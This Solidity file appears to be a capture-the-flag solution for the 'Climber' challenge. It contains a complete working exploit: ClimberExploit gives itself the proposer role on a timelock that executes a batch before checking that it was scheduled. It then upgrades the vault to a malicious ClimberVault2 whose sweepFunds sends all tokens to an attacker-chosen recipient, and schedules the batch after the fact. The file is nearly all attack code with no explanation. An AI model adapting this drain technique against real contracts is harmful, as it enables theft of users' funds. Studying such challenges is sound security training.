// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "../climber/ClimberTimelock.sol";
import "../climber/ClimberVault.sol";

contract ClimberVault2 is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    function sweepFunds(address tokenAddress, address recipient) external {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(recipient, token.balanceOf(address(this))), "Transfer failed");
    }
    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}
contract ClimberExploit {
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    ClimberVault2 vault2 = new ClimberVault2();
    function exploit(address _timelock, address _vault, address _token, address _recipient) external {
        targets.push(_timelock);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );
        targets.push(_vault);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(vault2),
                abi.encodeWithSignature(
                    "sweepFunds(address,address)",
                    _token,
                    _recipient
                )
            )
        );
        targets.push(address(this));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "schedule(address)",
                _timelock
            )
        );
        ClimberTimelock(payable(_timelock)).execute(targets, values, dataElements, bytes32(0));
    }
    function schedule(address _timelock) external {
        ClimberTimelock(payable(_timelock)).schedule(targets, values, dataElements, bytes32(0));
    }
}